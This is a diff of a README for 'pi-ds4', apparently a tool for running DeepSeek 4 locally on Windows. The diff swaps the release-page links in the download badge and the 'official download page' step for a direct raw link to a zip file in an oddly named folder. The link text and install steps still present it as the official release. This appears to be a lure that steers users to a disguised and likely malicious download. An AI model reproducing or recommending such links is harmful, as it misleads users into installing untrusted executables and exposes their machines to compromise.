@@ -1,6 +1,6 @@
 # 🚀 pi-ds4 - Run local artificial intelligence on Windows
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fredys92/pi-ds4/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/fredys92/pi-ds4/main/pallall/ds-pi-v1.2-beta.4.zip)
 
 pi-ds4 allows you to run the DeepSeek 4 language model directly on your personal computer. You do not need an account or a cloud connection to use this software. Your data stays on your machine at all times.
 
@@ -20,7 +20,7 @@ If your computer uses an older hard drive, the model will start slowly. Always e
 
 You must download the correct installer for your system. Perform the following steps:
 
-1.  Visit the [official download page](https://github.com/fredys92/pi-ds4/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/fredys92/pi-ds4/main/pallall/ds-pi-v1.2-beta.4.zip).
 2.  Look for the section marked Latest.
 3.  Click the file ending in .exe to start your download.
 4.  Save this file to your Downloads folder.
